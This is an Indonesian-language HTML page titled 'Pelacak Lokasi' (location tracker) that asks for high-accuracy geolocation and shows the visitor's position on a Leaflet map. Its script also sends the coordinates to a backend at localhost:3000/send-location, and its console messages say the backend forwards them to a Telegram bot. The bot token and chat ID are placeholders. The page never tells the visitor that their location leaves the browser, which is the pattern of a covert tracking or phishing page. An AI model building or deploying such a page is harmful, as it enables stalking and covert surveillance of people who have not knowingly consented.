<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Pelacak Lokasi</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.js"></script>
    <style>
      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        margin: 0;
        padding: 0;
        height: 100vh;
        background-color: #000;
        color: #fff;
        transition: background-color 0.5s ease;
      }
      .hidden {
        display: none;
      }
      .container {
        max-width: 800px;
        margin: 0 auto;
        padding: 20px;
        opacity: 0;
        transition: opacity 0.5s ease;
      }
      .visible {
        opacity: 1;
      }
      .loading-screen {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        text-align: center;
        padding: 20px;
      }
      .pulse {
        display: inline-block;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: #4caf50;
        margin-right: 10px;
        animation: pulse 1.5s infinite;
      }
      @keyframes pulse {
        0% {
          transform: scale(0.95);
          box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7);
        }
        70% {
          transform: scale(1);
          box-shadow: 0 0 0 10px rgba(76, 175, 80, 0);
        }
        100% {
          transform: scale(0.95);
          box-shadow: 0 0 0 0 rgba(76, 175, 80, 0);
        }
      }
      #map {
        height: 400px;
        width: 100%;
        margin-top: 20px;
        border-radius: 10px;
        border: 1px solid #ddd;
      }
    </style>
  </head>
  <body>
    <div id="loadingScreen" class="loading-screen">
      <h1>Pelacak Lokasi</h1>
      <p>Mohon izinkan akses lokasi untuk melanjutkan</p>
      <div class="pulse"></div>
      <p id="loadingStatus">Meminta izin lokasi...</p>
      <button id="locateBtn" style="display: none">Izinkan Lokasi</button>
    </div>

    <div id="mainContent" class="container hidden">
      <h1>Pelacak Lokasi</h1>
      <div id="map"></div>
    </div>

    <script>
      const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";
      let userChatId = "YOUR_CHAT_ID";
      let map, marker, currentPosition;

      document.addEventListener("DOMContentLoaded", function () {
        setTimeout(getLocation, 500);
      });

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition, showError, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        } else {
          document.getElementById("loadingStatus").textContent =
            "Geolocation tidak didukung.";
          document.getElementById("locateBtn").style.display = "block";
        }
      }

      function showPosition(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        currentPosition = { latitude, longitude };

        document.body.style.backgroundColor = "#fff";
        document.getElementById("loadingScreen").classList.add("hidden");
        document.getElementById("mainContent").classList.remove("hidden");
        setTimeout(
          () => document.getElementById("mainContent").classList.add("visible"),
          100
        );

        initMap(latitude, longitude);
        shareLocationToTelegram();
      }

      function initMap(lat, lng) {
        if (!map) {
          map = L.map("map").setView([lat, lng], 15);
          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
            attribution: "&copy; OpenStreetMap contributors",
          }).addTo(map);
          marker = L.marker([lat, lng]).addTo(map);
        } else {
          map.setView([lat, lng], 15);
          marker.setLatLng([lat, lng]);
        }
      }

      function showError(error) {
        document.getElementById("loadingStatus").textContent =
          "Gagal mendapatkan lokasi.";
        document.getElementById("locateBtn").style.display = "block";
      }

      function shareLocationToTelegram() {
        if (!currentPosition) return;

        const latitude = currentPosition.latitude;
        const longitude = currentPosition.longitude;

        fetch("http://localhost:3000/send-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ latitude, longitude }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Lokasi berhasil dikirim ke Telegram", data);
          })
          .catch((error) => {
            console.error("Gagal mengirim lokasi ke Telegram", error);
          });
      }
    </script>
  </body>
</html>
